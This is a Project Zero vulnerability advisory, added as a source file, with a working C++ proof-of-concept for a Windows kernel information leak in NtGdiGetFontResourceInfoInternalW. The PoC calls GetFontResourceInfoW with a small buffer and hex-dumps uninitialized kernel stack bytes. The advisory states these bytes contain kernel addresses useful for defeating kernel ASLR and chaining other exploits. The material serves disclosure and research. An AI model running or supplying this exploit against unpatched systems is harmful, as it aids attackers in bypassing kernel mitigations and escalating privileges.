@@ -1,0 +1,87 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1275
+
+We have discovered that the nt!NtGdiGetFontResourceInfoInternalW system call discloses portions of uninitialized kernel stack memory to user-mode clients.
+
+This is caused by the fact that for user-specified output buffer sizes up to 0x5c, a temporary stack-based buffer is used by the syscall for optimization. As opposed to the pool allocation, the stack memory area is not pre-initialized with zeros, and when it is copied back to user-mode in its entirety, its contents disclose leftover kernel stack bytes containing potentially sensitive information.
+
+The vulnerability is fixed in Windows 10, which has the following memset() call at the beginning of the function:
+
+--- cut ---
+.text:0025F9E6                 push    5Ch             ; size_t
+.text:0025F9E8                 push    ebx             ; int
+.text:0025F9E9                 lea     eax, [ebp+var_118]
+.text:0025F9EF                 push    eax             ; void *
+.text:0025F9F0                 call    _memset
+--- cut ---
+
+This indicates that Microsoft is aware of the bug but didn't backport the fix to systems earlier than Windows 10. The issue was in fact discovered by cross-diffing the list of memset calls between Windows 7 and Windows 10, which illustrates how easy it is to use exclusive patches for one system version to attack another.
+
+The attached proof-of-concept program demonstrates the disclosure. An example output is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 a9 fb c2 82 02 00 00 00 19 00 00 00 ................
+00000010: 00 00 00 00 46 69 6c 65 a8 6f 06 89 46 69 6c 65 ....File.o..File
+00000020: c8 00 00 00 ff 07 00 00 00 00 00 00 00 30 06 89 .............0..
+00000030: 00 08 00 00 46 02 00 00 68 72 b8 93 d0 71 b8 93 ....F...hr...q..
+00000040: a8 71 b8 93 00 8b 2e 9a 98 a8 a2 82 68 8b 2e 9a .q..........h...
+00000050: fa a8 a2 82 a8 71 b8 93 46 69 6c e5 ?? ?? ?? ?? .....q..Fil.....
+--- cut ---
+
+Only the first four bytes of the data are properly initialized to 0x00, while the rest are visibly leaked from the kernel stack and contain a multitude of kernel-space addresses, readily facilitating exploitation of other memory corruption vulnerabilities.
+
+The bug is limited to leaking at most ~0x5c bytes at a time, as specifying a larger size will provoke a correctly padded pool allocation instead of the stack-based buffer.
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+// Undocumented definitions for the gdi32!GetFontResourceInfoW function.
+typedef BOOL(WINAPI *PGFRI)(LPCWSTR, LPDWORD, LPVOID, DWORD);
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  // Resolve the GDI32!GetFontResourceInfoW symbol.
+  HINSTANCE hGdi32 = LoadLibrary(L"gdi32.dll");
+  PGFRI GetFontResourceInfo = (PGFRI)GetProcAddress(hGdi32, "GetFontResourceInfoW");
+
+  // Trigger the vulnerability and dump kernel stack output. The code assumes that Windows is
+  // installed on partition C:\ and the C:\Windows\Fonts\arial.ttf font is present on disk.
+  BYTE OutputBuffer[0x5c] = { /* zero padding */ };
+  DWORD OutputSize = sizeof(OutputBuffer);
+  if (!GetFontResourceInfo(L"C:\\Windows\\Fonts\\arial.ttf", &OutputSize, OutputBuffer, 5)) {
+    printf("GetFontResourceInfo failed.\n");
+    return 1;
+  }
+
+  PrintHex(OutputBuffer, sizeof(OutputBuffer));
+
+  return 0;
+}
